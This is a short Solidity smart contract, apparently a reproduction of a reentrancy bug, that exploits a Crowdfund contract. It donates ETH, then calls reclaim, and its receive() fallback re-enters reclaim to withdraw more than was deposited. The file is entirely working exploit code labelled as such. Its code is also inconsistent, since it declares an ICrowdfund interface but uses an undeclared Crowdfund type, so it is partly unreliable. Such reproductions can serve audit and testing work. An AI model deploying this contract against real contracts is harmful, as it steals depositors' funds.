interface ICrowdfund {
    function donate() external payable;
    function withdraw() external;
    function reclaim() external;
    function invstore() external;
}

contract Reproduction {
    Crowdfund public target;
    address public attacker;
    bool public reentered;
    uint public exploitValue;

    constructor(address _target) {
        target = Crowdfund(_target);
        attacker = msg.sender;
    }

    function setup() external payable {
        require(msg.value > 0, "Send ETH to start exploit");
        exploitValue = msg.value;
        target.donate{value: msg.value}();
    }

    function startExploit() external {
        target.invstore();
        target.reclaim();
    }

    receive() external payable {
        if (address(target).balance >= exploitValue && !reentered) {
            reentered = true;
            target.reclaim();
        }
    }
}